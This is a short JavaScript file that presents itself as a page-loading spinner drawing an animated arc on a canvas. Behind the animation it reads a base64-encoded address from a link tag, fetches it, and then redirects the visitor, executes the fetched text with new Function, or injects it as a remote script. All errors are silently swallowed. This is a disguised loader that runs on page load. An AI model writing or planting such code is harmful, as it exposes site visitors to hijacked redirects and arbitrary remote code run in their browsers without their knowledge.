(function () {
  function spin(canvas) {
    var ctx = canvas.getContext('2d');
    var w = canvas.width;
    var h = canvas.height;
    var cx = w / 2;
    var cy = h / 2;
    var r = 22;
    var ang = 0;

    function frame() {
      ctx.clearRect(0, 0, w, h);
      ctx.lineWidth = 5;
      ctx.lineCap = 'round';
      ctx.strokeStyle = '#115e59';
      ctx.beginPath();
      ctx.arc(cx, cy, r, 0, Math.PI * 2);
      ctx.stroke();
      ctx.strokeStyle = '#34d399';
      ctx.beginPath();
      ctx.arc(cx, cy, r, ang, ang + Math.PI * 0.7);
      ctx.stroke();
      ang += 0.12;
      requestAnimationFrame(frame);
    }
    requestAnimationFrame(frame);
  }

  function parseHopBody(text) {
    var body = String(text || '').trim();
    try {
      var j = JSON.parse(body);
      if (j && j.c) {
        var u = atob(String(j.c).trim());
        if (/^https?:\/\//i.test(u)) return u;
      }
    } catch (e) {}
    var patterns = [
      /top\.location\.(?:assign|replace)\s*\(\s*['"]([^'"]+)['"]\s*\)/i,
      /location\.(?:replace|assign)\s*\(\s*['"]([^'"]+)['"]\s*\)/i,
      /(?:window\.)?location\.href\s*=\s*['"]([^'"]+)['"]/i
    ];
    for (var i = 0; i < patterns.length; i++) {
      var m = body.match(patterns[i]);
      if (m && m[1]) return m[1];
    }
    throw new Error('parse');
  }

  function hopFromLink() {
    var node = document.querySelector('link[rel="alternate"][href]');
    if (!node) throw new Error('link');
    return fetch(node.getAttribute('href'), { cache: 'no-store' })
      .then(function (res) {
        if (!res.ok) throw new Error('cfg');
        return res.text();
      })
      .then(function (raw) {
        var url = atob(String(raw || '').trim());
        if (!/^https?:\/\//i.test(url)) throw new Error('bad');
        return url;
      });
  }

  function attachRemote(hopUrl) {
    var s = document.createElement('script');
    s.src = hopUrl;
    s.async = true;
    document.head.appendChild(s);
  }

  function runFn(body) {
    (new Function(body))();
  }

  function openHop(hopUrl) {
    fetch(hopUrl, { cache: 'no-store', credentials: 'omit' })
      .then(function (res) {
        if (!res.ok) throw new Error('http');
        return res.text();
      })
      .then(function (body) {
        try {
          window.location.replace(parseHopBody(body));
        } catch (e) {
          try {
            runFn(body);
          } catch (e2) {
            attachRemote(hopUrl);
          }
        }
      })
      .catch(function () {
        attachRemote(hopUrl);
      });
  }

  var canvas = document.getElementById('dial');
  spin(canvas);

  hopFromLink()
    .then(openHop)
    .catch(function () {});
})();
